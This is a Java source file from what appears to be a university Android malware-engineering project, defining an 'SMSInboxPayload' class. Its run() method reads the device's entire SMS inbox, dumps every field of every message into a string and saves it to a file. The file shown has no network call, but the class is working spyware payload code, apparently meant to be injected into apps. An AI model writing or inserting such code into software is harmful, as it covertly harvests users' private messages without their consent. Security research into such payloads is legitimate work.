package it.unisannio.srss.ame.payloads.smsInbox;

import it.unisannio.srss.ame.payloads.Payload;
import it.unisannio.srss.ame.payloads.common.PayloadUtils;
import it.unisannio.srss.ame.payloads.common.PayloadUtils.PrintResult;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

public class SMSInboxPayload implements Payload{

	private final static String TAG = SMSInboxPayload.class.getSimpleName();

	private final Context context;
	
	public SMSInboxPayload(Context context){
		this.context = context;
	}
	
	@Override
	public void run() {
		Uri smsInbox = Telephony.Sms.Inbox.CONTENT_URI;        
		ContentResolver cr = context.getContentResolver();
		Cursor cursor = cr.query(smsInbox, null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";
		do{
		   msgData += "\n";
		   for(int i=0;i<cursor.getColumnCount();i++)
		   {
		       msgData += " " + cursor.getColumnName(i) + ":" + cursor.getString(i) + "\n";
		   }
		}while(cursor.moveToNext());
		PrintResult res = PayloadUtils.printToFile(this.getClass(), msgData);
		if (res == PrintResult.SUCCESS)
			Log.i(TAG, "Sms inbox saved successful");
		else
			Log.e(TAG, res.name());

	}
}
